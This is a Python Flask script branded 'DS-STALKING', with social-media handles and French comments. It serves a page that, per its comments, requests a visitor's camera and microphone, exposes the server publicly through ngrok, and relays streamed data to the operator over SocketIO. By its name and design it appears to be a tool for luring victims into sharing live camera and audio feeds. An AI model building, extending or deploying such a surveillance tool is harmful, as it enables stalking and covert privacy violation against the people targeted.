from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import socket
import pyfiglet
import subprocess
import json
import time

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)
socketio = SocketIO(app)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

@app.route("/")
def home():
    # Page qui demande l'accès à la caméra et au micro
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port
    local_ip = get_local_ip()
    port = 5000  # Remplacez si nécessaire
    stream_url = f"http://{local_ip}:{port}/view_stream"
    return jsonify({"stream_url": stream_url})

# Flux vidéo
@app.route("/view_stream")
def view_stream():
    return render_template("view_stream.html")

# Fonction pour démarrer ngrok et obtenir l'URL publique
def get_ngrok_url():
    # Démarre ngrok en arrière-plan
    ngrok_process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)  # Attendre que ngrok démarre
    url = None

    # Lire la sortie de ngrok pour obtenir l'URL publique
    for line in ngrok_process.stdout:
        line = line.decode("utf-8")
        if "http" in line:
            url = line.split(" ")[1].strip()
            break

    return url

# Envoyer des données en temps réel vers Termux via socketio
@socketio.on('send_data')
def handle_data(message):
    print(f"Data received: {message}")
    emit('receive_data', {'data': f"Real-time Data: {message}"}, broadcast=True)

if __name__ == "__main__":
    # Démarrer ngrok pour exposer le serveur Flask
    ngrok_url = get_ngrok_url()

    # Afficher l'URL ngrok
    print(f"Serveur accessible à distance via : {ngrok_url}")

    # Lancer l'application Flask
    local_ip = get_local_ip()
    print(f"Serveur local en cours d'exécution : http://{local_ip}:5000")
    
    # Démarrer le serveur SocketIO
    socketio.run(app, host="0.0.0.0", port=5000)